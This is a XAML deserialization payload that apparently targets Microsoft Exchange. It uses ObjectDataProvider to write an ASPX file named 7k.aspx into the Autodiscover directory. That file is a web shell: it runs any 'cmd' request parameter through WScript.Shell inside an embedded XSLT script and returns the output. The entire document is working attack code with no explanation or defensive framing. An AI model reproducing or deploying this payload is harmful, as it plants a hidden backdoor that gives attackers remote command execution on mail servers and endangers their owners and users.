<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
    xmlns:s="clr-namespace:System;assembly=mscorlib"
    xmlns:w="clr-namespace:System.Web;assembly=System.Web">
  <s:String x:Key="a" x:FactoryMethod="s:Environment.GetEnvironmentVariable" x:Arguments="ExchangeInstallPath"/>
  <s:String x:Key="b" x:FactoryMethod="Concat">
    <x:Arguments>
      <StaticResource ResourceKey="a"/>
      <s:String>ClientAccess\\Autodiscover\\7k.aspx</s:String>
    </x:Arguments>
  </s:String>
  <ObjectDataProvider x:Key="x" ObjectType="{x:Type s:IO.File}" MethodName="WriteAllText">
    <ObjectDataProvider.MethodParameters>
      <StaticResource ResourceKey="b"/>
      <s:String>&lt;%@page language=&quot;C#&quot;%&gt;

&lt;%@ import Namespace=&quot;System.IO&quot;%&gt;

&lt;%@ import Namespace=&quot;System.Xml&quot;%&gt;

&lt;%@ import Namespace=&quot;System.Xml.Xsl&quot;%&gt;

&lt;%
string xml=@&quot;&lt;?xml version=&quot;&quot;1.0&quot;&quot;?&gt;&lt;root&gt;test&lt;/root&gt;&quot;;
string xslt=@&quot;&lt;?xml version='1.0'?&gt;
&lt;xsl:stylesheet version=&quot;&quot;1.0&quot;&quot; xmlns:xsl=&quot;&quot;http://www.w3.org/1999/XSL/Transform&quot;&quot; xmlns:msxsl=&quot;&quot;urn:schemas-microsoft-com:xslt&quot;&quot; xmlns:zcg=&quot;&quot;zcgonvh&quot;&quot;&gt;
    &lt;msxsl:script language=&quot;&quot;JScript&quot;&quot; implements-prefix=&quot;&quot;zcg&quot;&quot;&gt;
    &lt;msxsl:assembly name=&quot;&quot;mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&quot;/&gt;
    &lt;msxsl:assembly name=&quot;&quot;System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&quot;/&gt;
    &lt;msxsl:assembly name=&quot;&quot;System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;/&gt;
    &lt;msxsl:assembly name=&quot;&quot;System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;/&gt;
        &lt;![CDATA[function xml(){
        var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;
        var command = Request.Item['cmd'];
        var r = new ActiveXObject(&quot;&quot;WScript.Shell&quot;&quot;).Exec(&quot;&quot;cmd /c &quot;&quot;+command);
        var OutStream = r.StdOut;
        var Str = &quot;&quot;&quot;&quot;;
        while (!OutStream.atEndOfStream) {
            Str = Str + OutStream.readAll();
            }
        Response.Write(&quot;&quot;&lt;pre&gt;&quot;&quot;+Str+&quot;&quot;&lt;/pre&gt;&quot;&quot;);
        }]]&gt;
    &lt;/msxsl:script&gt;
&lt;xsl:template match=&quot;&quot;/root&quot;&quot;&gt;
    &lt;xsl:value-of select=&quot;&quot;zcg:xml()&quot;&quot;/&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;&quot;;
XmlDocument xmldoc=new XmlDocument();
xmldoc.LoadXml(xml);
XmlDocument xsldoc=new XmlDocument();
xsldoc.LoadXml(xslt);
XsltSettings xslt_settings = new XsltSettings(false, true);
xslt_settings.EnableScript = true;
try{
    XslCompiledTransform xct=new XslCompiledTransform();
    xct.Load(xsldoc,xslt_settings,new XmlUrlResolver());
    xct.Transform(xmldoc,null,new MemoryStream());
}
catch (Exception e){
    Response.Write(&quot;Error&quot;);
}
%&gt;
</s:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  <ObjectDataProvider x:Key="c" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""/>
  <ObjectDataProvider x:Key="d" ObjectInstance="{StaticResource c}" MethodName="get_Response"/>
  <ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource d}" MethodName="End"/>
</ResourceDictionary>